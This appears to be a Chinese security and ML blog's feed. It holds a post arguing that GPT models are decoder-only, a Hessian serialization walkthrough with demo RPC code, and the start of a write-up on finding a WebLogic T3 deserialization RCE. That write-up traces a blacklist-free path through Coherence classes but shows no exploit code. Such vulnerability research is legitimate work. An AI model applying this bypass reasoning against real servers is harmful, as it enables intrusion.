<p>如文档所说，两套cgroup manager同时用会导致不稳定，需要修改runc的启动参数。</p>
<p><img src="image4.png" alt=""></p>
]]></content>
      <tags>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title>Does GPT&#39;s &#39;decoder-only&#39; architecture mean it consists of only a decoder?</title>
    <url>/2025/05/24/GPT%E7%9A%84decoder-only%E6%98%AF%E5%8F%AA%E6%9C%89decoder%E5%90%97/</url>
    <content><![CDATA[<p><strong>GPT的decoder-only是只有decoder吗？</strong></p>
<p>事情的起因是我和朋友争论GPT模型到底有没有encoder。他认为GPT或类似的模型其实有一个很小的encoder，并且encoder和decoder之间会有cross attention。而我的观点则是GPT只有decoder部分，没有encoder。</p>
<p>于是有了这篇论文考古。</p>
<p><strong>GPT</strong></p>
<p>论文链接：<a href="https://cdn.openai.com/research-covers/language-unsupervised/language%5C_understanding%5C_paper.pdf">https://cdn.openai.com/research-covers/language-unsupervised/language\_understanding\_paper.pdf</a></p>
<p><strong>GPT 1.0</strong></p>
<p>GPT1.0分为训练和微调</p>
<p>训练</p>
<p><img src="image1.png" alt=""></p>
<p>微调</p>
<p><img src="image2.png" alt=""></p>
<p><img src="image3.png" alt=""></p>
<p>训练就是纯预测（优化一个目标函数），微调是同时做预测和分类（作者发现这样泛化性更好），优化目标为一组目标函数的和。</p>
<p>架构图可以到，就是只用了解码器，没有用编码器。</p>
<p><img src="image4.png" alt=""></p>
<p>论文中谈及架构的时候提到了引用34和62。说他们使用的decoder是来自transformer的一个变体。</p>
<p><a href="https://arxiv.org/pdf/1801.10198">GENERATING WIKIPEDIA BY SUMMARIZING LONG<br>
SEQUENCES</a></p>
<p>Attention is all you need.</p>
<p>34的文章提出了一个decoder-only的架构，用来生成像维基百科一样的文章，作者认为用decoder-only能够关注更长的序列，这比常见的在序列转换任务中使用的编码器—解码器架构所能处理的序列要长得多。在引言部分和模型示例图可以看到他们模型只包含deocder.</p>
<p><img src="image5.png" alt=""></p>
<p><img src="image6.png" alt=""></p>
<p><img src="image7.png" alt=""></p>
<p>作者仅以不做了实验发现，比起encoder-decoder架构，decoder-only能微量提点，但是能处理的长度显著增加。</p>
<p><img src="image8.png" alt=""></p>
<p><strong>那么原来做cross attention那一层去哪里了？</strong></p>
<p><strong>在GPT1.0和它引用的论文里面是直接删掉了。只有masked multi-head<br>
attention</strong></p>
<p><strong>GPT 2.0</strong></p>
<p>那在GPT2.0, 3.0用了吗？</p>
<p>Language Models are Unsupervised Multitask Learners</p>
<p><a href="https://cdn.openai.com/better-language-models/language%5C_models%5C_are%5C_unsupervised%5C_multitask%5C_learners.pdf">https://cdn.openai.com/better-language-models/language\_models\_are\_unsupervised\_multitask\_learners.pdf</a></p>
<p>GPT2.0在模型描述里面提到只在GPT1.0上做了微小改动，如果加了encoder应该属于模型大变化，应该会提到。</p>
<p><img src="image9.png" alt=""></p>
<p><img src="image10.png" alt=""></p>
<p>从源码里面看就是decoder-only<br>
<a href="https://github.com/openai/gpt-2/blob/master/src/model.py">https://github.com/openai/gpt-2/blob/master/src/model.py</a></p>
<p><strong>GPT 3.0</strong></p>
<p>Language Models are Few-Shot Learners</p>
<p><a href="https://arxiv.org/pdf/2005.14165">https://arxiv.org/pdf/2005.14165</a></p>
<p>提到架构和GPT2.0一样</p>
<p><img src="image11.png" alt=""></p>
<p><strong>GPT 4.0</strong></p>
<p>CloseAI的技术报告没有提模型细节，一种比较可靠的说法是他们要做多模态所以引入的ViT或者clip之类的技术理解媒体文件。但是这里我猜应该是只是做完embedding和文字的embedding一起输入，不能算是有&quot;cross-attention&quot;的encoder。</p>
<p><img src="image12.png" alt=""></p>
<p><img src="image13.png" alt=""></p>
<p><strong>Decoder only有什么好处？</strong></p>
<p>这里借用<a href="https://www.zhihu.com/question/588325646/answer/3357252612?s_r=0&amp;utm_medium=social&amp;utm_source=wechat_session">知乎这里的讨论</a><br>
重新梳理一下。</p>
<p><strong>注意力机制的数学特性（苏剑林观点）</strong></p>
<p>**核心观点：**双向注意力容易退化为低秩，而因果注意力必然满秩。</p>
<p><strong>详细解释与例子：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">双向注意力示例</span><br><span class="line">句子：&quot;我爱北京天安门&quot;</span><br><span class="line">双向注意力矩阵（简化示例）</span><br><span class="line">[</span><br><span class="line">[0.2, 0.2, 0.2, 0.2, 0.2], &quot;我&quot;看所有词</span><br><span class="line">[0.2, 0.2, 0.2, 0.2, 0.2], &quot;爱&quot;看所有词</span><br><span class="line">[0.2, 0.2, 0.2, 0.2, 0.2], &quot;北京&quot;看所有词</span><br><span class="line">[0.2, 0.2, 0.2, 0.2, 0.2], &quot;天安&quot;看所有词</span><br><span class="line">[0.2, 0.2, 0.2, 0.2, 0.2], &quot;门&quot;看所有词</span><br><span class="line">]</span><br><span class="line">容易退化为低秩：所有行向量相似</span><br><span class="line">因果注意力示例（decoder-only）</span><br><span class="line">[</span><br><span class="line">[1.0, 0, 0, 0, 0], &quot;我&quot;只看自己</span><br><span class="line">[0.5, 0.5, 0, 0, 0], &quot;爱&quot;看&quot;我&quot;和自己</span><br><span class="line">[0.3, 0.3, 0.4, 0, 0], &quot;北京&quot;看前面的词</span><br><span class="line">[0.2, 0.2, 0.3, 0.3, 0], &quot;天安&quot;看前面的词</span><br><span class="line">[0.2, 0.2, 0.2, 0.2, 0.2], &quot;门&quot;看所有前面的词</span><br><span class="line">]</span><br><span class="line">下三角矩阵，必然满秩，表达能力更强</span><br></pre></td></tr></table></figure>
<p>如果注意力矩阵变成低秩，相当于模型&quot;眼里看到的东西都一样&quot;，很多不同的位置/内容其实被糊成了一坨，没法细致地区分信息。</p>
<p><strong>预测任务难度与泛化能力（@yili观点）</strong></p>
<p>**核心观点：**更难的预测任务促使模型学习更好的通用表征。</p>
<p><strong>具体例子：</strong></p>
<p>预测&quot;北京&quot;这个词时：</p>
<p>Encoder-Decoder：可以看到完整句子&quot;我爱[MASK]天安门&quot;，从两边获取信息</p>
<p>Decoder-Only：只能看到&quot;我爱&quot;，必须从更少的信息中推断</p>
<p>这种&quot;信息饥渴&quot;迫使模型：</p>
<p>学习更强的语言模型能力</p>
<p>更好地理解词序和语法结构</p>
<p>形成更通用的表征</p>
<p><strong>上下文学习的天然优势（@mimimumu观点）</strong></p>
<p>**核心观点：**Decoder-only架构让prompt能直接作用于每一层。</p>
<p><strong>Few-shot学习示例：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入你给出的格式去掉多余斜线，改成：</span><br><span class="line"></span><br><span class="line">问：什么是机器学习？</span><br><span class="line">答：机器学习是让计算机从数据中学习的技术。</span><br><span class="line"></span><br><span class="line">问：什么是深度学习？</span><br><span class="line">答：[模型生成]</span><br></pre></td></tr></table></figure>
<p>在Decoder-only中：</p>
<p>每个token的表示逐层构建时，都能直接参考前面的示例</p>
<p>Prompt信息像&quot;隐式微调&quot;一样影响每一层的计算</p>
<p>而Encoder-Decoder需要先编码完整输入，再解码，信息传递路径更长。</p>
<p><strong>隐式位置编码特性</strong></p>
<p>**核心观点：**因果注意力天然具有位置敏感性。</p>
<p><strong>对比例子：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">没有位置编码的双向注意力</span><br><span class="line">&quot;我爱你&quot; 和 &quot;你爱我&quot; 可能产生相似的表示</span><br><span class="line"></span><br><span class="line">因果注意力（即使没有显式位置编码）</span><br><span class="line">&quot;我爱你&quot;：</span><br><span class="line"></span><br><span class="line">&quot;我&quot;：只看自己</span><br><span class="line">&quot;爱&quot;：看&quot;我&quot;+&quot;爱&quot;</span><br><span class="line">&quot;你&quot;：看&quot;我&quot;+&quot;爱&quot;+&quot;你&quot;</span><br><span class="line">&quot;你爱我&quot;：</span><br><span class="line"></span><br><span class="line">&quot;你&quot;：只看自己</span><br><span class="line">&quot;爱&quot;：看&quot;你&quot;+&quot;爱&quot;</span><br><span class="line">&quot;我&quot;：看&quot;你&quot;+&quot;爱&quot;+&quot;我&quot;</span><br><span class="line">表示完全不同，天然区分语序</span><br></pre></td></tr></table></figure>
<p><strong>KV-Cache复用机制</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一轮</span><br><span class="line">用户：&quot;介绍一下北京&quot;</span><br><span class="line">模型：生成回答，缓存所有KV</span><br><span class="line"></span><br><span class="line">第二轮</span><br><span class="line">用户：&quot;它的人口有多少？&quot;</span><br><span class="line"></span><br><span class="line">Decoder-only：直接复用第一轮的KV-Cache</span><br><span class="line">只需计算新输入的KV，效率极高</span><br><span class="line"></span><br><span class="line">Encoder-Decoder：需要重新编码整个上下文</span><br><span class="line">因为encoder看到的是完整输入，任何改变都需要重新计算</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>ML</tag>
      </tags>
  </entry>
  <entry>
    <title>Hessian 序列化代码分析及业务场景学习</title>
    <url>/2020/01/03/Hessian-%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%8F%8A%E4%B8%9A%E5%8A%A1%E5%9C%BA%E6%99%AF%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<!-- Hessian是一个轻量级的remotingonhttp工具，使用简单的方法提供了RMI的功能 -->
<!-- more -->
<h2 id="介绍">介绍</h2>
<p>Hessian是一个轻量级的remotingonhttp工具，使用简单的方法提供了RMI的功能。早在08年有人做过测试：一个UserData类，有一个字符串属性，一个日期属性,一个double属性，分别用java,hessian来序列化一百万次,结果让人吃惊,不止是hessian序列化的速度要比java的快上一倍，而且hessian序列化后的字节数也要比java的少一倍。</p>
<h2 id="序列化">序列化</h2>
<p>序列化宏观来看就四步</p>
<ol>
<li>建立进行序列化的工厂类</li>
<li>用工厂类找到要要进行序列化类对应的序列化器</li>
<li>序列化器对将进行序列化的对象进行内省</li>
<li>内省完成后调用序列化器的writeObject（writeObject中按照一定规则把数据写入byte流）</li>
</ol>
<p>下面用Hessian简单序列化一个对象来看</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    User() &#123;</span><br><span class="line">        age = <span class="number">18</span>;</span><br><span class="line">        name = <span class="string">&quot;cl0und&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HessianTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        ByteArrayOutputStream os=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        HessianOutput output=<span class="keyword">new</span> <span class="title class_">HessianOutput</span>(os);</span><br><span class="line">        output.writeObject(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="建立进行序列化的工厂类">建立进行序列化的工厂类</h3>
<p>把ByteArrayOutputStream放入了HessianOutput中典型的装饰器模式。<br>
<img src="1578018650932-4f7b0b12-c08d-49fd-9b13-a106a7241095.png" alt="image.png"></p>
<p>新建序列工厂类（后续会通过工厂类来寻找类的对应序列化器）。<br>
<img src="1578018510750-27953aaa-dcd1-4479-9534-9324d5dbaef7.png" alt="image.png"></p>
<p>工厂类的创建过程中，在类静态块中加入了java各种类型的反序列器以及和Hessian有关的反序列器。这里和序列化没关系，只是提一嘴。<img src="1578056872628-e9e64d41-63d6-4a29-851e-31f645c46dcb.png" alt="image.png"></p>
<p>在类初始化完成后，正式进入SerializerFactory的构造方法。可以看到SerializerFactory允许不安全的序列化，设置默认的上下文工厂类是_contextFactory，这个_contextFactory是生产序列化器的工厂。<br>
<img src="1578018782918-44d51486-ba54-496b-b388-08cce55da23f.png" alt="image.png"></p>
<p><img src="1578020378163-c8312b90-7712-4eee-9793-98befa59ba79.png" alt="image.png"></p>
<h3 id="用工厂类找到要要进行序列化类对应的序列化器">用工厂类找到要要进行序列化类对应的序列化器</h3>
<p>根据传入类型获取相应的序列化器。<br>
<img src="1578018871570-0e8cbc5b-bc58-460c-b6d2-d44fac4f9232.png" alt="image.png"></p>
<p>获取序列化器的规则是如果_cachedSerializerMap里面又就直接从里面取，如果没有就用loadSerializer找，找出来的加入_cachedSerializerMap避免二次加载。<br>
<img src="1578018931958-a405efcd-b970-48fc-a579-6ab9dd9adbd5.png" alt="image.png"></p>
<p>loadSerializer找的逻辑是先看有没有其它工厂类，如果有就用，如果没有就用_contextFactory造。<br>
<img src="1578019332986-acb7d611-ab63-4eab-9417-1595a87e8f89.png" alt="image.png"></p>
<p>因为User是自建类型_contextFactory造不出对应序列化器。<br>
<img src="1578020722501-2751e375-f821-4b90-a060-d4a89929b36f.png" alt="image.png"></p>
<p>下一步尝试getCustomSerializer来找序列化器，看方法的意思应该是找是否有客户自己定制的序列化器。生成序列器规则是：如果_customSerializerMap有就直接返回，如果没有就按照_类名+HessianSerializer_的规则来找。很遗憾我们并没有对User做个性化定制。<br>
<img src="1578020850955-a7f2fca3-0f4d-4446-8c74-78584c1adcfe.png" alt="image.png"></p>
<p>因为没有我们没有对User做个性化的序列化器，所以最后会调用getDefaultSerializer来返回默认序列化器。又因为User既不是内置类也不是和hessian有关的特殊类但是允许了不安全的序列化，所以最后被选中的序列化器是UnsafeSerializer。<br>
<img src="1578036755615-9fda6962-c2ee-4250-ae0d-bf9ac12f1573.png" alt="image.png"></p>
<h3 id="序列化器对序列化对象进行内省">序列化器对序列化对象进行内省</h3>
<p>在构造方法中使用introspect进行内省。<br>
<img src="1578022299793-2d917569-2b48-4a40-b641-1f7dbd68d54d.png" alt="image.png"></p>
<p><img src="1578022661148-31eaa214-4623-4d53-8c03-d54625986822.png" alt="image.png"></p>
<p>introspect最后几步是在为类里面的属性找序列化器（getFiledSerializer）。<br>
<img src="1578026402777-b2f40c49-d717-475e-9874-d7244f823d85.png" alt="image.png"></p>
<p>比如这里User类中name属性是String，就创建针对String的序列化器。<br>
<img src="1578026468907-63b0955a-6cb0-4fde-b2b8-079ec936e618.png" alt="image.png"></p>
<p>String的序列化器包含了field类及其偏移量。<br>
<img src="1578035822247-43e9dad1-3122-4c40-861c-9f05f0346dc2.png" alt="image.png"></p>
<p>创建类及及其字段序列化器后一路向外传，然后调用writeObject。<br>
<img src="1578054376515-e69a20a8-3ee8-4a8e-9a16-f422e144c663.png" alt="image.png"></p>
<p><img src="1578054878060-3ec4b6c4-b62d-44e3-b0af-76d33c0a5385.png" alt="image.png"></p>
<p>writeObjectBegin 写了Object的魔术头、长度、类名<br>
<img src="1578059835151-a62d0cba-183f-44b6-85e2-a59c69e2cb89.png" alt="image.png"><br>
<img src="1578059865287-b2958526-3372-450b-90c6-3900ad380034.png" alt="image.png"><br>
writeObject10 负责序列化字段<br>
<img src="1578055007325-a2d4943e-0e7a-41e5-b9ce-2b92ccf5ed7e.png" alt="image.png"></p>
<p>先是写要序列化的字符串魔术值、字段名长度、字段名，其中 <code>os.write(83)</code> 代表 <code>S</code> 代表字符串。<img src="1578055257437-7c63a33c-2d8b-4e64-971b-c70f9519f5dc.png" alt="image.png"></p>
<p>String类型学序列化的时候<br>
<img src="1578055611722-af337b28-b489-4381-80b9-831a7fa87df4.png" alt="image.png"><br>
<img src="1578055873704-aa60f07f-6ba7-4cc8-9727-bec3787f9861.png" alt="image.png"></p>
<p>int类型序列化的时候<br>
<img src="1578055767135-360790fd-1b05-4b4c-a963-ffc97ca83946.png" alt="image.png"><br>
<img src="1578055703641-922968f1-89be-4dae-8423-5fcf0cb4f734.png" alt="image.png"></p>
<p>最后的结果<br>
<img src="1578059987421-90e3ff15-6b85-448e-9785-a08152c6ef01.png" alt="image.png"></p>
<h2 id="业务场景">业务场景</h2>
<h3 id="环境搭建">环境搭建</h3>
<p>说穿了就是RPC，用实际的代码来看看<br>
pom.xml加入</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.caucho<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hessian<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.60<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>web.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">web-app</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"> <span class="string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta"> <span class="string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HessianServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.caucho.hessian.server.HessianServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>service-class<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>org.syclover.hessian.BasicService<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HessianServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/api/service<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码忘记从网上哪里copy的了，侵删。</p>
<p>client/server端共有代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.syclover.hessian;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IBasicApi</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 设置用户名 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">setUserName</span><span class="params">(String name)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取问候 */</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取用户信息 */</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">getUser</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>client端代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.syclover.hessian;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.client.HessianProxyFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClientTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://localhost:8080/hessianTest_war_exploded/api/service&quot;</span>;</span><br><span class="line">        <span class="type">HessianProxyFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianProxyFactory</span>();</span><br><span class="line">        <span class="type">IBasicApi</span> <span class="variable">api</span> <span class="operator">=</span> (IBasicApi) factory.create(IBasicApi.class, url);</span><br><span class="line">        api.setUserName(<span class="string">&quot;mahc&quot;</span>);</span><br><span class="line">        System.out.println(api.sayHello());</span><br><span class="line">        System.out.println(api.getUser().getName());</span><br><span class="line">        System.out.println(api.getUser().getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>server端代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.syclover.hessian;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.syclover.hessian.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BasicService</span> <span class="keyword">implements</span> <span class="title class_">IBasicApi</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">setUserName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + name + <span class="string">&quot;,Welcome to Hessian!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">User</span>(name, <span class="number">23</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.syclover.hessian;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, Integer age)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(Integer age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里为了测试方便把c/s放到一起了<br>
<img src="1578060757509-0a3de905-6438-4bea-bfab-f18df997a87a.png" alt="image.png"></p>
<h3 id="进行RPC">进行RPC</h3>
<p><img src="1578060910923-4235fecb-4e57-4c19-990c-5ea3502505a5.png" alt="image.png"></p>
<h2 id="参考">参考</h2>
<p><a href="https://blog.csdn.net/mahoking/article/details/51704966">Hessian使用教程</a><br>
<a href="https://juejin.im/entry/595996e25188250d8324118d">JVM 类装载原理分析－ClassLoader原理分析</a><br>
<a href="https://www.iteye.com/topic/245238">hessian 序列化实现 初探</a></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>How Did I Find Weblogic T3 RCE</title>
    <url>/2021/08/31/How-Did-I-Find-Weblogic-T3-RCE/</url>
    <content><![CDATA[<p>文章首发于<a href="https://xz.aliyun.com/t/9068">先知社区</a><br>
​<br>
获得噱头oracle公开致谢</p>
<!-- more -->
<p><img src="image-20210120160134548.png" alt="image-20210120160134548.png"><br>
之前这个补丁没有修好，有CVE-2021-2135和CVE-2021-2136两种绕过。<br>
<img src="image-1.png" alt="image-1.png"><br>
挖不动，把之前思路再发出来，等下个补丁日向师傅们学习了。</p>
<h2 id="CASE-1">CASE 1</h2>
<p>最初引起我注意的是ExternalizableLite#readExternalizableLite，可以看到这里直接从数据流里面读取了类名并新建对象。<br>
<img src="image-20201115104803787.png" alt="image-20201115104803787.png"><br>
下面又会调用value自身的readExternal((DataInput)in)方法。<br>
新建出来的对象会调用自己的readExternal。<br>
<img src="image-20201115105149062.png" alt="image-20201115105149062.png"><br>
当对象构造好之后又会在realize中调用readResolve方法<br>
<img src="image-20201122194515676.png" alt="image-20201122194515676.png"><br>
<img src="image-20201122194554729.png" alt="image-20201122194554729.png"><br>
结合这里三点来看，相当于是一个免黑名单检查的反序列化场景。<br>
我们只需要往上回朔，看能否到反序列化的入口点就行了。<br>
<img src="image-20201115105910924.png" alt="image-20201115105910924.png"><br>
<img src="image-20201115105938644.png" alt="image-20201115105938644.png"></p>
<p><img src="image-20201115110032708.png" alt="image-20201115110032708.png"><br>
<img src="image-20201115110126348.png" alt="image-20201115110126348.png"><br>
然后全局搜com.tangosol.util.ExternalizableHelper#readObject(java.io.DataInput)，可以在很多类的readExternal(java.io.DataInput)中看到这样的调用。<br>
<img src="image-20201115111618606.png" alt="image-20201115111618606.png"><br>
回朔到这一步的时候我还以为成了，但是测了一下发现，在反序列化的时候java根本不会调用这个方法。因为这里函数的签名是readExternal(java.io.DataInput)而不是正统的readExternal(java.io.ObjectInput)。</p>
<p>有些不甘心，于是乎把coherence.jar里面的readExternal(java.io.ObjectInput)全部抓了出来。</p>
